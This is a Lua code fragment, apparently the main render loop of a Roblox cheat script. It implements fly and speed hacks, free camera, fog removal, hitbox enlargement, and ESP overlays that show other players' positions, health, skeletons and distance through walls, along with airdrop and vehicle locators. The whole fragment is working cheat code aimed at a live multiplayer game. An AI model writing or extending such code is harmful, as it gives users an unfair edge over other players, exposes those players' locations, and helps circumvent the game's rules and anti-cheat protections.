-- ============================================================
-- MAIN RENDER LOOP
-- ============================================================
local frameCount = 0
RunService.RenderStepped:Connect(function(dt)
    frameCount += 1
    updateWatermark()

    -- Enforce ambiance
    if Toggles.NoFog and Toggles.NoFog.Value and Lighting.FogEnd<1e5 then
        Lighting.FogEnd=1e6; Lighting.FogStart=1e6
    end
    if Toggles.FullBright and Toggles.FullBright.Value and Lighting.Ambient~=Color3.new(1,1,1) then
        Lighting.Ambient=Color3.new(1,1,1); Lighting.OutdoorAmbient=Color3.new(1,1,1); Lighting.Brightness=2
    end
    if Toggles.TimeOfDayEnabled and Toggles.TimeOfDayEnabled.Value then
        Lighting.ClockTime = Options.TimeOfDay and Options.TimeOfDay.Value or 14
    end

    -- Hitboxes every 10 frames
    if frameCount%10==0 and Toggles.HitboxEnabled and Toggles.HitboxEnabled.Value then updateHitboxes() end

    -- ── FLY ──────────────────────────────────────────────────
    if Toggles.FlyEnabled and Toggles.FlyEnabled.Value then
        if not flying and flySpaceHoldStart and (tick()-flySpaceHoldStart)>=0.1 then
            activateFly()
        end
    end

    if flying then
        local character = LocalPlayer.Character
        local rootPart  = character and character:FindFirstChild("HumanoidRootPart")
        local humanoid  = character and character:FindFirstChild("Humanoid")
        if rootPart and humanoid and flyBodyVelocity and flyBodyGyro then
            humanoid.PlatformStand = true
            flyBodyGyro.CFrame = Camera.CFrame
            local mv = Vector3.zero
            local cf = Camera.CFrame
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then mv+=cf.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then mv-=cf.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then mv-=cf.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then mv+=cf.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then mv+=Vector3.new(0,1,0)
            else mv-=Vector3.new(0,1,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.Q) then mv-=Vector3.new(0,1,0) end
            local flySpeed = Options.FlySpeed and Options.FlySpeed.Value or 50
            flyBodyVelocity.Velocity = mv.Magnitude>0 and mv.Unit*flySpeed or Vector3.zero
        end
    end

    -- ── SPEED ─────────────────────────────────────────────────
    do
        local speedOn   = Toggles.SpeedEnabled and Toggles.SpeedEnabled.Value
        local speedChar = LocalPlayer.Character
        local speedHum  = speedChar and speedChar:FindFirstChild("Humanoid")
        local speedRoot = speedChar and speedChar:FindFirstChild("HumanoidRootPart")
        if not speedOn or not speedHum or not speedRoot or flying then
            if speedBV or speedLV then cleanupSpeed() end
        else
            local moveDir = speedHum.MoveDirection
            local spd = Options.SpeedValue and Options.SpeedValue.Value or 32
            local useLinear = pcall(function() return Instance.new("LinearVelocity") end)
            if useLinear then
                if not speedLV or not speedLV.Parent then
                    cleanupSpeed()
                    speedAttachment = Instance.new("Attachment")
                    speedAttachment.Position=Vector3.zero; speedAttachment.Parent=speedRoot
                    speedLV = Instance.new("LinearVelocity")
                    speedLV.Attachment0=speedAttachment
                    speedLV.VelocityConstraintMode=Enum.VelocityConstraintMode.Plane
                    speedLV.MaxForce=math.huge; speedLV.RelativeTo=Enum.ActuatorRelativeTo.World
                    speedLV.PlaneVelocity=Vector2.new(0,0)
                    speedLV.PrimaryTangentAxis=Vector3.new(1,0,0)
                    speedLV.SecondaryTangentAxis=Vector3.new(0,0,1)
                    speedLV.Parent=speedRoot
                end
                speedLV.PlaneVelocity = moveDir.Magnitude>0.1
                    and Vector2.new(moveDir.X*spd, moveDir.Z*spd)
                    or  Vector2.new(0,0)
            else
                if not speedBV or not speedBV.Parent then
                    cleanupSpeed()
                    speedBV = Instance.new("BodyVelocity")
                    speedBV.MaxForce=Vector3.new(1e5,0,1e5); speedBV.P=1e4; speedBV.Parent=speedRoot
                end
                speedBV.Velocity = moveDir.Magnitude>0.1
                    and Vector3.new(moveDir.X*spd, 0, moveDir.Z*spd)
                    or  Vector3.zero
            end
        end
    end

    -- ── FREE CAM ───────────────────────────────────────────────
    if freeCamActive and Toggles.FreeCamEnabled and Toggles.FreeCamEnabled.Value then
        local spd = (Options.FreeCamSpeed and Options.FreeCamSpeed.Value or 60) * dt
        local mouseDelta = UserInputService:GetMouseDelta()
        freeCamYaw   = freeCamYaw   - mouseDelta.X * 0.003
        freeCamPitch = math.clamp(freeCamPitch - mouseDelta.Y * 0.003, -math.pi/2+0.05, math.pi/2-0.05)
        local rotCF = CFrame.new(freeCamCFrame and freeCamCFrame.Position or Camera.CFrame.Position)
            * CFrame.fromEulerAnglesYXZ(freeCamPitch, freeCamYaw, 0)
        local mv = Vector3.zero
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then mv+=rotCF.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then mv-=rotCF.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then mv-=rotCF.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then mv+=rotCF.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.E) then mv+=Vector3.new(0,1,0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.Q) then mv-=Vector3.new(0,1,0) end
        local newPos = rotCF.Position
        if mv.Magnitude>0 then newPos=newPos+mv.Unit*spd end
        freeCamCFrame = CFrame.new(newPos) * CFrame.fromEulerAnglesYXZ(freeCamPitch, freeCamYaw, 0)
        Camera.CFrame = freeCamCFrame
        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
    elseif not (Toggles.FreeCamEnabled and Toggles.FreeCamEnabled.Value) and freeCamActive then
        deactivateFreeCam()
    end

    -- ── ITEM CHAMS ─────────────────────────────────────────────
    if Toggles.ItemChamEnabled and Toggles.ItemChamEnabled.Value then
        local baseCol = Options.ItemChamColor and Options.ItemChamColor.Value or Color3.fromRGB(0,200,255)
        itemChamScanFrame+=1
        if itemChamScanFrame>=30 then itemChamScanFrame=0; itemChamParts=getItemParts() end
        for _, part in ipairs(itemChamParts) do
            if part and part.Parent then
                part.Material=Enum.Material.ForceField; part.Color=baseCol; part.Transparency=0
            end
        end
    end

    -- ── ARM CHAMS ──────────────────────────────────────────────
    if Toggles.ArmChamEnabled and Toggles.ArmChamEnabled.Value then
        local rainbow = Toggles.ArmChamRainbow and Toggles.ArmChamRainbow.Value
        local armCol = Options.ArmChamColor and Options.ArmChamColor.Value or Color3.fromRGB(255,150,50)
        if rainbow then
            armRainbowHue=(armRainbowHue+0.5)%360; armCol=Color3.fromHSV(armRainbowHue/360,1,1)
        end
        if frameCount%10==0 then saveOriginals(getArmParts, armChamOriginals) end
        for part in pairs(armChamOriginals) do
            if part and part.Parent then
                part.Material=Enum.Material.ForceField; part.Color=armCol; part.Transparency=0
            end
        end
    end

    -- ── ESP ────────────────────────────────────────────────────
    local espOn      = Toggles.ESPEnabled and Toggles.ESPEnabled.Value
    local showBoxes  = Toggles.ESPBoxes and Toggles.ESPBoxes.Value
    local showNames  = Toggles.ESPNames and Toggles.ESPNames.Value
    local showDist   = Toggles.ESPDistance and Toggles.ESPDistance.Value
    local showHealth = Toggles.ESPHealth and Toggles.ESPHealth.Value
    local visCheck   = Toggles.ESPVisibleCheck and Toggles.ESPVisibleCheck.Value
    local thickness  = Options.ESPThickness and Options.ESPThickness.Value or 1
    local boxColor   = Options.ESPBoxColor and Options.ESPBoxColor.Value or Color3.fromRGB(255,182,193)
    local visColor   = Options.ESPVisibleColor and Options.ESPVisibleColor.Value or Color3.fromRGB(255,255,255)
    local myChar     = LocalPlayer.Character
    local myRoot     = myChar and myChar:FindFirstChild("HumanoidRootPart")
    local useDisplay = Toggles.ESPDisplayName and Toggles.ESPDisplayName.Value

    for _, player in pairs(Players:GetPlayers()) do
        if player==LocalPlayer then continue end
        local ok, character = pcall(function() return getModel:Invoke(player) end)
        if not ok or not character then
            if espBoxes[player] then removeESPBox(espBoxes[player]); espBoxes[player]=nil end
            espRayParams[player]=nil; continue
        end
        local inLighting = character:IsDescendantOf(Lighting)
        local inWorld = character:IsDescendantOf(workspace)
        if not inWorld and not inLighting then
            if espBoxes[player] then removeESPBox(espBoxes[player]); espBoxes[player]=nil end
            espRayParams[player]=nil; continue
        end
        local humanoid = character:FindFirstChild("Humanoid")
        if not humanoid then if espBoxes[player] then hideESPBox(espBoxes[player]) end; continue end
        if not espBoxes[player] then espBoxes[player]=createESPBox() end
        local box = espBoxes[player]
        if not espOn then hideESPBox(box); continue end

        local bounds = getCharacterBounds(character)
        if not bounds then hideESPBox(box); continue end
        local corners = {
            bounds.Max, Vector3.new(bounds.Max.X,bounds.Max.Y,bounds.Min.Z),
            Vector3.new(bounds.Max.X,bounds.Min.Y,bounds.Max.Z), Vector3.new(bounds.Max.X,bounds.Min.Y,bounds.Min.Z),
            Vector3.new(bounds.Min.X,bounds.Max.Y,bounds.Max.Z), Vector3.new(bounds.Min.X,bounds.Max.Y,bounds.Min.Z),
            Vector3.new(bounds.Min.X,bounds.Min.Y,bounds.Max.Z), bounds.Min,
        }
        local minX,minY = math.huge,math.huge
        local maxX,maxY = -math.huge,-math.huge
        local anyOnScreen = false
        for _, corner in ipairs(corners) do
            local sp, on = Camera:WorldToViewportPoint(corner)
            if on and sp.Z>0 then
                anyOnScreen=true
                minX=math.min(minX,sp.X); minY=math.min(minY,sp.Y)
                maxX=math.max(maxX,sp.X); maxY=math.max(maxY,sp.Y)
            end
        end
        if not anyOnScreen then hideESPBox(box); continue end
        minX-=2; minY-=2; maxX+=2; maxY+=2
        local width,height = maxX-minX, maxY-minY
        local cx = (minX+maxX)/2

        local isVisible = true
        if visCheck and myRoot then
            if not espRayParams[player] then
                local p = RaycastParams.new()
                p.FilterDescendantsInstances={myChar, character}
                p.FilterType=Enum.RaycastFilterType.Exclude
                espRayParams[player]=p
            end
            local root2 = character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart
            if root2 then
                isVisible = not workspace:Raycast(myRoot.Position, root2.Position-myRoot.Position, espRayParams[player])
            end
        end
        local col = isVisible and visColor or boxColor

        if showBoxes then
            box.Fill.Visible=true; box.Fill.Color=col; box.Fill.Thickness=thickness
            box.Fill.Position=Vector2.new(minX+1,minY+1); box.Fill.Size=Vector2.new(width-2,height-2)
            box.Outline.Visible=true; box.Outline.Thickness=thickness+1
            box.Outline.Position=Vector2.new(minX,minY); box.Outline.Size=Vector2.new(width,height)
        else box.Fill.Visible=false; box.Outline.Visible=false end

        box.NameText.Visible=showNames
        if showNames then
            box.NameText.Position=Vector2.new(cx,minY-18)
            box.NameText.Text=useDisplay and player.DisplayName or player.Name
            box.NameText.Color=col
        end

        box.StatusText.Visible=showNames and inLighting
        if showNames and inLighting then
            box.StatusText.Position=Vector2.new(maxX+4,minY-18); box.StatusText.Text="In Car"
        end

        box.DistText.Visible=showDist
        if showDist then
            local root3=character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart
            local dist=myRoot and root3 and math.floor((myRoot.Position-root3.Position).Magnitude) or 0
            box.DistText.Position=Vector2.new(cx,minY-(showNames and 32 or 18)); box.DistText.Text=dist.."m"
        end

        local showRep = Toggles.ESPReputation and Toggles.ESPReputation.Value
        box.RepText.Visible=showRep
        if showRep then
            local ls=player:FindFirstChild("leaderstats")
            local repStat=ls and (ls:FindFirstChild("Reputation") or ls:FindFirstChild("Rep"))
            box.RepText.Text="Rep: "..(repStat and tostring(repStat.Value) or "?")
            box.RepText.Position=Vector2.new(cx,minY-((showNames and showDist) and 46 or (showNames or showDist) and 32 or 18))
        end

        box.HealthBg.Visible=showHealth; box.HealthFill.Visible=showHealth
        if showHealth and humanoid.MaxHealth>0 then
            local pct=math.clamp(humanoid.Health/humanoid.MaxHealth,0,1)
            local barX=minX-6
            box.HealthBg.Position=Vector2.new(barX,minY); box.HealthBg.Size=Vector2.new(4,height)
            box.HealthFill.Color=Color3.new(1-pct,pct,0)
            box.HealthFill.Position=Vector2.new(barX+1,minY+1+(height-2)*(1-pct))
            box.HealthFill.Size=Vector2.new(2,(height-2)*pct)
        end
    end

    -- ── CHAMS ─────────────────────────────────────────────────
    local chamsOn = Toggles.ESPLiteEnabled and Toggles.ESPLiteEnabled.Value
    if chamsOn and frameCount%6==0 then
        local visCol=Options.ESPLiteVisColor and Options.ESPLiteVisColor.Value or Color3.fromRGB(0,255,100)
        local hidCol=Options.ESPLiteHidColor and Options.ESPLiteHidColor.Value or Color3.fromRGB(255,50,50)
        local showChamNames=Toggles.ESPLiteNames and Toggles.ESPLiteNames.Value
        local showChamDist=Toggles.ESPLiteDist and Toggles.ESPLiteDist.Value
        local myRoot2=LocalPlayer.Character and LocalPlayer.Character.PrimaryPart
        for _, player in pairs(Players:GetPlayers()) do
            if player==LocalPlayer then continue end
            local okL, charL = pcall(function() return getModel:Invoke(player) end)
            if not okL or not charL then if chamsData[player] then restoreChams(player) end; continue end
            if not chamsData[player] then saveOriginalParts(charL, player) end
            local data = chamsData[player]
            if not data then continue end
            local myRoot3=LocalPlayer.Character and LocalPlayer.Character.PrimaryPart
            local theirRoot=charL.PrimaryPart or charL:FindFirstChild("HumanoidRootPart")
            local isVis=true
            if myRoot3 and theirRoot then
                local params=RaycastParams.new()
                params.FilterDescendantsInstances={LocalPlayer.Character, charL}
                params.FilterType=Enum.RaycastFilterType.Exclude
                isVis=not workspace:Raycast(myRoot3.Position, theirRoot.Position-myRoot3.Position, params)
            end
            local col = isVis and visCol or hidCol
            setChamsParts(charL, col)
            local rootL=charL.PrimaryPart or charL:FindFirstChild("HumanoidRootPart")
            if rootL then
                local sp,on=Camera:WorldToViewportPoint(rootL.Position+Vector3.new(0,2.5,0))
                if on and sp.Z>0 then
                    data.nameLabel.Visible=showChamNames
                    if showChamNames then
                        data.nameLabel.Position=Vector2.new(sp.X,sp.Y-2)
                        local useDN=Toggles.ESPLiteDisplayName and Toggles.ESPLiteDisplayName.Value
                        data.nameLabel.Text=useDN and player.DisplayName or player.Name
                        data.nameLabel.Color=col
                    end
                    data.distLabel.Visible=showChamDist and myRoot2~=nil
                    if showChamDist and myRoot2 then
                        data.distLabel.Position=Vector2.new(sp.X,sp.Y+14)
                        data.distLabel.Text=math.floor((myRoot2.Position-rootL.Position).Magnitude).."m"
                    end
                else
                    data.nameLabel.Visible=false; data.distLabel.Visible=false
                end
            end
        end
    elseif not chamsOn then
        for player in pairs(chamsData) do restoreChams(player) end
    end

    -- ── ARROWS ────────────────────────────────────────────────
    do
        local arrowOn=Toggles.ESPArrows and Toggles.ESPArrows.Value
        local maxDist=Options.ESPArrowDanger and Options.ESPArrowDanger.Value or 3000
        local distFromC=Options.ArrowDist and Options.ArrowDist.Value or 80
        local triH=Options.ArrowHeight and Options.ArrowHeight.Value or 16
        local triW=Options.ArrowWidth and Options.ArrowWidth.Value or 16
        local triColor=Options.ArrowColor and Options.ArrowColor.Value or Color3.fromRGB(255,255,255)
        local myRoot2=LocalPlayer.Character and LocalPlayer.Character.PrimaryPart
        local viewCenter=Camera.ViewportSize/2
        local function rv(v,deg)
            local a=math.rad(deg)
            return Vector2.new(v.X*math.cos(a)-v.Y*math.sin(a), v.X*math.sin(a)+v.Y*math.cos(a))
        end
        local function getRelative(worldPos)
            if not myRoot2 then return Vector2.new(0,0) end
            local camP=Camera.CFrame.Position; local rootP=myRoot2.Position
            local rel=CFrame.new(Vector3.new(rootP.X,camP.Y,rootP.Z),camP):PointToObjectSpace(worldPos)
            return Vector2.new(rel.X, rel.Z)
        end
        for _, player in pairs(Players:GetPlayers()) do
            if player==LocalPlayer then continue end
            local okC, charC = pcall(function() return getModel:Invoke(player) end)
            if not okC or not charC then
                if arrowObjects[player] then arrowObjects[player]:Remove(); arrowObjects[player]=nil end
                continue
            end
            local humanoidC=charC:FindFirstChild("Humanoid")
            local rootC=charC.PrimaryPart or charC:FindFirstChild("HumanoidRootPart")
            if not arrowObjects[player] then
                local tri=Drawing.new("Triangle"); tri.Visible=false; tri.Filled=true
                tri.Thickness=1; tri.Transparency=1; arrowObjects[player]=tri
            end
            local arrow=arrowObjects[player]
            if not arrowOn or not rootC or not myRoot2 or not humanoidC or humanoidC.Health<=0 then
                arrow.Visible=false; continue
            end
            local dist3D=(myRoot2.Position-rootC.Position).Magnitude
            if dist3D>maxDist then arrow.Visible=false; continue end
            local _, onScreen=Camera:WorldToViewportPoint(rootC.Position)
            if onScreen then
                arrow.Visible=false
                if frameCount%30==0 then
                    local key=player.UserId; local now=tick()
                    if not notifCooldowns[key] or (now-notifCooldowns[key])>=10 then
                        notifCooldowns[key]=now
                        pushNotification(("Player Nearby (%s): %.0fm"):format(player.Name,dist3D))
                        if Toggles.ProxSoundEnabled and Toggles.ProxSoundEnabled.Value then
                            playSound(Options.ProxSoundID and Options.ProxSoundID.Value or "9120385810",
                                      Options.ProxSoundPitch and Options.ProxSoundPitch.Value or 1)
                        end
                    end
                end
                continue
            end
            local rel=getRelative(rootC.Position)
            local direction=rel.Unit
            local base=direction*distFromC; local half=triW/2
            arrow.Color=triColor
            arrow.PointA=viewCenter-(base+rv(direction,90)*half)
            arrow.PointB=viewCenter-(base+rv(direction,-90)*half)
            arrow.PointC=viewCenter-(direction*(distFromC+triH))
            arrow.Visible=true
        end
        for player in pairs(arrowObjects) do
            if not player.Parent then arrowObjects[player]:Remove(); arrowObjects[player]=nil end
        end
    end

    -- ── SKELETON ESP ──────────────────────────────────────────
    do
        local skelOn=Toggles.SkeletonEnabled and Toggles.SkeletonEnabled.Value
        local skelColor=Options.SkeletonColor and Options.SkeletonColor.Value or Color3.fromRGB(0,255,100)
        local skelThick=Options.SkeletonThickness and Options.SkeletonThickness.Value or 2
        local SKEL_CONNECTIONS = {
            {"Head","Torso"},{"Torso","left arm"},{"Torso","right arm"},
            {"Torso","left leg"},{"Torso","right leg"},
        }
        for _, player in pairs(Players:GetPlayers()) do
            if player==LocalPlayer then continue end
            if not skelOn then
                if skeletonLines[player] then for _,l in pairs(skeletonLines[player]) do l.Visible=false end end
                continue
            end
            local ok, char = pcall(function() return getModel:Invoke(player) end)
            if not ok or not char then
                if skeletonLines[player] then for _,l in pairs(skeletonLines[player]) do l.Visible=false end end
                continue
            end
            local humanoid=char:FindFirstChild("Humanoid")
            if not humanoid or humanoid.Health<=0 then
                if skeletonLines[player] then for _,l in pairs(skeletonLines[player]) do l.Visible=false end end
                continue
            end
            local hitbox=char:FindFirstChild("Hitbox")
            if not hitbox then
                if skeletonLines[player] then for _,l in pairs(skeletonLines[player]) do l.Visible=false end end
                continue
            end
            if not skeletonLines[player] then skeletonLines[player]={} end
            local lines=skeletonLines[player]
            for i, conn in ipairs(SKEL_CONNECTIONS) do
                local partA=hitbox:FindFirstChild(conn[1]); local partB=hitbox:FindFirstChild(conn[2])
                if not lines[i] then
                    local l=Drawing.new("Line"); l.Visible=false; l.Thickness=skelThick
                    l.Color=skelColor; l.Transparency=1; lines[i]=l
                end
                local line=lines[i]; line.Color=skelColor; line.Thickness=skelThick
                if partA and partB then
                    local spA,onA=Camera:WorldToViewportPoint(partA.Position)
                    local spB,onB=Camera:WorldToViewportPoint(partB.Position)
                    if onA and onB and spA.Z>0 and spB.Z>0 then
                        line.From=Vector2.new(spA.X,spA.Y); line.To=Vector2.new(spB.X,spB.Y); line.Visible=true
                    else line.Visible=false end
                else line.Visible=false end
            end
        end
    end

    -- ── AIRDROP ESP ───────────────────────────────────────────
    do
        local adOn=Toggles.AirdropESP and Toggles.AirdropESP.Value
        local adCol=Options.AirdropColor and Options.AirdropColor.Value or Color3.fromRGB(255,200,0)
        local adArrow=Toggles.AirdropArrow and Toggles.AirdropArrow.Value
        airdropLabel.Color=adCol; airdropArrow.Color=adCol
        local locator=workspace:FindFirstChild("Airdrop") and workspace.Airdrop:FindFirstChild("Locator")
        if adOn and locator and locator:IsA("BasePart") then
            local sp,onScreen=Camera:WorldToViewportPoint(locator.Position)
            if onScreen and sp.Z>0 then
                airdropLabel.Visible=true; airdropArrow.Visible=false
                airdropLabel.Position=Vector2.new(sp.X,sp.Y-20)
                local dist=myRoot and math.floor((myRoot.Position-locator.Position).Magnitude) or 0
                airdropLabel.Text="AIRDROP  "..dist.."m"
            else
                airdropLabel.Visible=false
                if adArrow then
                    airdropArrow.Visible=true
                    local vc=Camera.ViewportSize/2
                    local myRP=LocalPlayer.Character and LocalPlayer.Character.PrimaryPart
                    if myRP then
                        local camP=Camera.CFrame.Position
                        local rel=CFrame.new(Vector3.new(myRP.Position.X,camP.Y,myRP.Position.Z),camP):PointToObjectSpace(locator.Position)
                        local dir2=Vector2.new(rel.X,rel.Z).Unit
                        local adist=90; local half=10
                        local function rv2(v,deg)
                            local a=math.rad(deg)
                            return Vector2.new(v.X*math.cos(a)-v.Y*math.sin(a),v.X*math.sin(a)+v.Y*math.cos(a))
                        end
                        airdropArrow.PointA=vc-(dir2*adist+rv2(dir2,90)*half)
                        airdropArrow.PointB=vc-(dir2*adist+rv2(dir2,-90)*half)
                        airdropArrow.PointC=vc-(dir2*(adist+16))
                    end
                else airdropArrow.Visible=false end
            end
        else airdropLabel.Visible=false; airdropArrow.Visible=false end
    end

    -- ── VEHICLE ESP ───────────────────────────────────────────
    do
        local carOn=Toggles.CarESP and Toggles.CarESP.Value
        local carCol=Options.CarESPColor and Options.CarESPColor.Value or Color3.fromRGB(100,200,255)
        local occupiedOnly=Toggles.CarESPOccupied and Toggles.CarESPOccupied.Value
        local carsFolder=workspace:FindFirstChild("__cars")
        for carModel, lbl in pairs(carESPLabels) do
            if not carModel.Parent then lbl:Remove(); carESPLabels[carModel]=nil end
        end
        if carOn and carsFolder then
            for _, car in ipairs(carsFolder:GetChildren()) do
                if not car:IsA("Model") then continue end
                local body=car.PrimaryPart or car:FindFirstChildWhichIsA("BasePart")
                if not body then continue end
                if occupiedOnly then
                    local hasOccupant=false
                    for _, plr in ipairs(Players:GetPlayers()) do
                        if plr==LocalPlayer then continue end
                        local char=plr.Character
                        local root=char and (char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart)
                        if root and (root.Position-body.Position).Magnitude<15 then hasOccupant=true; break end
                    end
                    if not hasOccupant then
                        if carESPLabels[car] then carESPLabels[car].Visible=false end; continue
                    end
                end
                if not carESPLabels[car] then
                    local lbl=Drawing.new("Text"); lbl.Size=13; lbl.Center=true; lbl.Outline=true
                    lbl.Font=Drawing.Fonts.Monospace; lbl.Visible=false; carESPLabels[car]=lbl
                end
                local lbl=carESPLabels[car]; lbl.Color=carCol
                local sp,onScreen=Camera:WorldToViewportPoint(body.Position+Vector3.new(0,2,0))
                if onScreen and sp.Z>0 then
                    lbl.Visible=true; lbl.Position=Vector2.new(sp.X,sp.Y)
                    lbl.Text=(car.Name or "Vehicle").."  "..(myRoot and math.floor((myRoot.Position-body.Position).Magnitude) or 0).."m"
                else lbl.Visible=false end
            end
        else for _,lbl in pairs(carESPLabels) do lbl.Visible=false end end
    end

    -- Cleanup stale boxes
    if frameCount%60==0 then
        for player, box in pairs(espBoxes) do
            if not Players:FindFirstChild(player.Name) then
                removeESPBox(box); espBoxes[player]=nil; espRayParams[player]=nil
            end
        end
    end
end)

